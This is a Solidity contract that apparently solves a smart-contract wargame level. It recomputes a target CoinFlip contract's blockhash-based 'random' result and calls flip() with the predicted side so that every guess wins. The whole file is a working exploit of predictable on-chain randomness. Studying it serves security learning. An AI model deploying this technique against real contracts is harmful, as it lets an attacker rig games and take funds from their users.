pragma solidity ^0.8.0;

import "./CoinFlip.sol";

contract CoinFlipHack {
    CoinFlip public hackedContract;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    // _hackedContractAddr = 0xA91C791D56895210967d1ec7a69Fe4b8fc7a910e;

    constructor(address _hackedContractAddr) public {
        hackedContract = CoinFlip(_hackedContractAddr);
    }

    function flip() public returns (bool){
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = uint256(blockValue/FACTOR);
        bool side = coinFlip == 1 ? true : false;
        hackedContract.flip(side);
    }

}
